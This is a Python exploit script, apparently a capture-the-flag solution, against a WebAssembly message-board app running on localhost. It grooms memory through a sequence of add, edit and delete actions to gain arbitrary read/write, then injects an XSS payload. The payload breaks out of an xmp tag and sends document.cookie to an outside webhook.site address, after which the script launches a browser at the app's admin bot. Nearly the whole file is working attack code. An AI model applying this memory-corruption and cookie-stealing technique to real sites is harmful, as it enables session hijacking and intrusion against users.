import os 
import sys
import argparse
import base64
import json 
import urllib.parse

parser = argparse.ArgumentParser()
parser.add_argument("--sync",action="store_true", help="To sync the state of the current module")
parser.add_argument("--admin",action="store_true", help="To run against admin context")
parser.add_argument("--port", type=int, help="Port of the vulnerable programme")
parser.add_argument("--xss", action="store_true", help="To run against XSS context")
parser.add_argument("--debug", action="store_true", help="To run in debug mode")
args = parser.parse_args()

port = 5501

# browser = "/usr/bin/google-chrome-stable"
# browser = "/usr/bin/firefox"

if(args.xss):
    print("[+] XSS MODE ENABLED")
    browser = "/usr/bin/firefox"

if (args.debug):
    print("[+] DEBUG MODE ENABLED")
    browser = "/usr/bin/google-chrome-stable"

if (args.sync):
    print("[+] SYNCING AND BUILDING FILES\n")
    os.system("./build.sh")
    exit(0)

if (args.port):
    port = args.port
    
msgidx = 0
msgid = 0 
msgarr = []
json_payload = []

def addmsg( payload, time ):
    global json_payload,msgidx,msgid
    while msgidx in msgarr:
        msgidx += 1
    msgarr.append(msgidx)
    retval = msgidx
    msgidx += 1
    msgid += 1
    json_payload.append({'action' : 'add', 'content' : payload, 'time' : time })
    return retval

def delmsg( idx ):
    global json_payload,msgidx
    msgarr.pop(idx)
    msgidx = len(msgarr)
    json_payload.append({ 'action': 'delete', 'msgId': idx })

def editmsg( msg_id, content, time ):
    global json_payload
    json_payload.append({ 'action':'edit', 'msgId': msg_id, 'content': content, 'time': time })

to_free = []

# [1] - reallocate the stuff array 
for i in range (10):
    to_free.append(addmsg("a"*8,0x0))

# [2] - Fill it up with non zero words

to_free.append(addmsg( "a"*100 ,0x0))

for i in range (7):
    to_free.append(addmsg( f"{chr(0x61 + i)}" ,0x0))

# [3] - Get the msg you write to right before the cachetable
to_free.append(addmsg( "aaaaa" ,0x0))
x = addmsg( "A" ,0x0)

# Just some padding 
for i in range (11):
    if (i == 8):
        val = addmsg( ("<div id='</xmp><img src=x onerror=window.open(\"https://webhook.site/c8ffd937-c232-4423-8be6-512fe17d58be/?flag=\"+document.cookie)>'></div>").ljust(150-4,"a") + "" ,0x0)
        continue
    to_free.append(addmsg( f"CHUNK-{i + 20}" ,0x0))

# [4] - Allocate the chunk we write to 
y = addmsg( "aaa" ,0x0)
print(x,y)

# Now we have arb-read-write :D
# With msgid 0x12 having cached_msg->data as cached_msg of id 31
# [PART 1 - CHANGE HTML]

# since we haven't deleted a single message msg_id = msg_idx
editmsg(18,f"{chr(0x35)}",0x0)
editmsg(31,f"xmp",0x0)

editmsg(18,f"{chr(0x3f)}",0x0)
editmsg(31,f"xmp",0x0)

editmsg(18,f"aaaa{chr(0x6c)}",0x0)

delmsg(31)

print(f"[+] MSG ID NOW : {msgid}")

payloadStr = json.dumps(json_payload, separators=(',', ':'))

# USE PAYLOAD ON A RUNNING WASM MODULE CLIENTSIDE MACHINE 
print(f"[+] PAYLOAD : {payloadStr}")
b64e_payload = base64.b64encode(payloadStr.encode('utf-8')).decode('utf-8')
b64e_payload = urllib.parse.quote(b64e_payload)
print(f"[+] BASE64 PAYLOAD : {b64e_payload}")

p1 = f"\"http://127.0.0.1:{port}/bot"
p2 = "\""
p3 = f"?visit={b64e_payload}\""

# 0x00010034 
# 0x00012964
# 11 -6

if (args.admin):
    os.system(f"{browser} --new-tab " + p1 + p3)
else:
    os.system(f"{browser} --new-tab " + p1 + p2)
